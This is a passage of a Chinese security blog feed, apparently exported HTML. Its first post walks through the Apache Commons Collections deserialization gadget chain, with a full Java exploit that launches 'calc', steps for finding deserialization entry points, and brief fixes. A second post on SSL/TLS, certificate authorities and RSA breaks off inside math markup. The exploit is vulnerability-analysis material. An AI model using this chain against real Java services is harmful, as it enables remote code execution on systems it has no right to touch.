class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class clazz = Runtime.class;</span><br><span class="hljs-comment">//Method getRuntimeMethod = clazz.getMethod("getRuntime", null);</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">getRunmethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getDeclaredMethod"</span>, <br>                               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class}, <br>                               <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>})<br>     .transform(Runtime.class);<br><br><span class="hljs-comment">//Runtime cmd = (Runtime) getRuntimeMethod.invoke(null, null);</span><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>, <br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class}, <br>                                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>})<br>    .transform(getRunmethod);<br><span class="hljs-comment">//Method cmdMethod = clazz.getMethod("exec", String.class);</span><br><span class="hljs-comment">//cmdMethod.invoke(cmd, "calc");</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>}).transform(cmd);<br></code></pre></td></tr></table></figure><p>好了，解决了不能反序列化的问题，但是这样构造破坏了我们的序列化链，之前只有一个<code>InvokerTransformer</code>对象，现在变成了3个，那么如何解决这个问题？</p><p>这时需要一个新的函数，聚焦到<code>org.apache.commons.collections.functors</code>包下面的<code>ChainedTransformer</code>类。</p><p>这个类存在transform方法可以帮我们遍历InvokerTransformer，并且循环调用遍历的InvokerTransformer的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    iTransformers = transformers;<br>}<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Transforms the input to result via each decorated transformer</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the transformed result</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> {<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) {<br>        object = iTransformers[i].transform(object);<br>    }<br>    <span class="hljs-keyword">return</span> object;<br>}<br></code></pre></td></tr></table></figure><p>所以只需要把上面的代码构造成一个Transformer数组即可，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>};<br><span class="hljs-comment">//把transformers的4个Transformer执行</span><br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>到这里，Runtime类不能反序列化的问题就解决了。</p><p>但是，有一个致命问题，<strong>在这样使用ChainTransformer时，我们的Runtime.class也就是参数该如何传入？</strong></p><p>会不会有一个Transformer的transform函数就是返回参数本身呢，答案是有的😋</p><p>刚刚好到<code>org.apache.commons.collections.functors</code>包下的<code>ConstantTransformer</code>类。它里面的transform就是返回我们传入的对象，如果我们传入Runtime.class，那返回的也即是Runtime.class。我们可以利用<code>ConstantTransformer</code>类解决问题了。<br>ok，到此为止，我们可以编写完整的payload了。</p><h2 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h2><p>完整项目可以直接从<a href="https://github.com/3xsh0re/CC_ChainDemo">我的测试代码仓库</a>拉取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception{<br>    <span class="hljs-comment">// 第一层</span><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>})<br>    };<br>    <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-comment">// 第二层</span><br>    Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">"value"</span>, <span class="hljs-string">"3xsh0re"</span>);<br><br>    <span class="hljs-comment">//TransformedMap.decorate方法调用TransformedMap的构造方法</span><br>    <span class="hljs-comment">//构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。</span><br>    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, transformerChain);<br><br>    <span class="hljs-comment">// 通过反射获取AnnotationInvocationHandler的实例</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>    annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);<br>    serialize(obj);<br>    unserialize(<span class="hljs-string">"./exec.bin"</span>);<br>}<br></code></pre></td></tr></table></figure><ol><li><p>漏洞触发场景</p><p>在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：</p><ul><li><p>HTTP请求中的参数，cookies以及Parameters。</p></li><li><p>RMI协议，被广泛使用的RMI协议完全基于序列化</p></li><li><p>JMX 同样用于处理序列化对象</p></li><li><p>自定义协议 用来接收与发送原始的java对象</p></li></ul></li><li><p>漏洞挖掘</p><ul><li><p>确定反序列化输入点</p></li><li><p>首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：</p><p>源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。</p><p>对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等</p><p>注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</p></li><li><p>再考察应用的Class Path中是否包含Apache Commons Collections库</p></li><li><p>生成反序列化的payload</p></li><li><p>提交我们的payload数据</p></li></ul></li></ol><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>禁止JVM执行外部命令</li><li>TransformedMap 类去掉了 Map.Entry 的 setValue 方法</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解SSL/TLS</title>
    <link href="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/"/>
    <url>/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/</url>
    
    <content type="html"><![CDATA[<p>其实抛开项目内容不谈，这里我详细分析了SSL/TLS建立安全连接的流程，以及部分加密算法的数学原理，以及SSL是如何工作在CA以及证书上的。</p><span id="more"></span><h3 id="项目内容"><a href="#项目内容" class="headerlink" title="项目内容"></a>项目内容</h3><p>采用Python语言，基于OpenSSL库实现证书颁发机构(CA)程序，并基于证书签发机制和公钥密码体制(RSA算法)实现了SSL握手流程，完成客户端与服务端之间共享密钥的交换，并且在消息传输的过程中采用对称加密算法(AES)对明文消息进行加密。</p><h3 id="CA以及CA的工作原理"><a href="#CA以及CA的工作原理" class="headerlink" title="CA以及CA的工作原理"></a>CA以及CA的工作原理</h3><p>CA是证书颁发机构的简称，证书颁发机构是一个可信任的实体，负责颁发、管理和撤销数字证书。数字证书用于在公钥基础设施 (PKI) 中验证身份，并确保在网络通信中数据的安全性和完整性。</p><p><strong>CA的作用是作为公证人，在一次SSL握手过程中，假设我们没有CA颁发的证书作为验证，那么考虑此时客户端被中间人劫持，在双方交换密钥的过程中，中间人可以自己的公钥发送给客户端，此时客户端没有别的信息来鉴别这个公钥，因此中间人会维持两个对话，一个是中间人-客户端，一个是中间人-服务端。所以此时需要一个中间人来证明这个公钥是可信安全的，CA就出现了，服务端会将自己的公钥（在证书请求文件CSR里）发给CA，CA使用签名算法和CA自己的私钥给这个公钥签名，也就是生成证书，那么客户端就可以使用CA的公钥来对服务端的证书进行验证</strong></p><p>工作过程：</p><ol><li>根证书的基础是一个公钥和私钥对，这对密钥是 CA 用于签署其他证书的核心。这个过程包括：<ul><li><strong>选择加密算法</strong>：常用的算法包括<code>RSA</code>和<code>ECC</code>。<code>RSA</code>通常使用 2048 位或更高的密钥长度，而<code>ECC</code>使用更短但安全性相当的密钥长度（如 256 位）。我们选择的是RSA加密算法。</li><li><strong>生成密钥对</strong>：使用安全的硬件安全模块 (HSM) 或可信的软件工具生成公钥和私钥对。私钥必须严格保密，通常存储在 HSM 中，以防泄露。</li></ul></li><li>CA自身生成证书请求文件，然后对其进行自签名，这个证书称为根证书，作为认证链的基础</li><li>客户端生成证书请求文件.csr，发送给CA进行签名</li><li>签名后返回客户端证书.crt</li></ol><h3 id="公钥基础设施PKI和信任链"><a href="#公钥基础设施PKI和信任链" class="headerlink" title="公钥基础设施PKI和信任链"></a>公钥基础设施PKI和信任链</h3><p>简单来说，PKI就是一套用于管理数字证书的体系结构。</p><p>关于信任链的话，我们知道在建立SSL链接的时候需要使用证书进行身份验证，那么证书颁发机构的安全性又如何保证呢，其实很简单，让更高一级的CA对低一级的CA证书进行签名，这样一层一层的向下保证，<strong>只需要保证根CA的安全性即可</strong>。</p><h3 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h3><p><code>RSA（Rivest-Shamir-Adleman）</code>算法是一种<strong>非对称加密算法</strong>，广泛应用于数字证书的颁发和验证过程中。<code>RSA</code>算法在证书颁发中的主要作用包括生成密钥对、加密和解密数据、以及数字签名和验证。<strong>RSA是公钥密码体制中的一个重要算法</strong>。</p><p><strong>公钥</strong>：公开发布并包含在数字证书中，用于加密数据和验证数字签名。<strong>通过公钥我们就可以判断这个证书是否是受信任的CA颁发的。</strong></p><p><strong>私钥</strong>：保密并由持有者妥善保管。<strong>在证书颁发过程中，CA 使用其私钥对证书进行数字签名。</strong></p><p><strong>数学推导：</strong></p><ul><li><p>首先选取两个大素数<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="3.185ex" height="1.439ex" role="img" focusable="false" viewBox="0 -442 1407.7 636"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(947.7,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>。这很重要，RSA的基础就是大素数分解困难问题</p></li><li><p>计算它们的乘积：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="8.313ex" height="1.758ex" role="img" focusable="false" viewBox="0 -583 3674.6 777"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1933.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(2436.6,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3214.6,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>​</p></li><li><p>计算欧拉函数：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="22.736ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10049.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2251.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3307.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3696.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(4421.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(5422,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5922,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(6311,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(7089,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7478,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(8160.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(9160.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(9660.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p></li><li><p>选择一个与 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.466ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1974 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 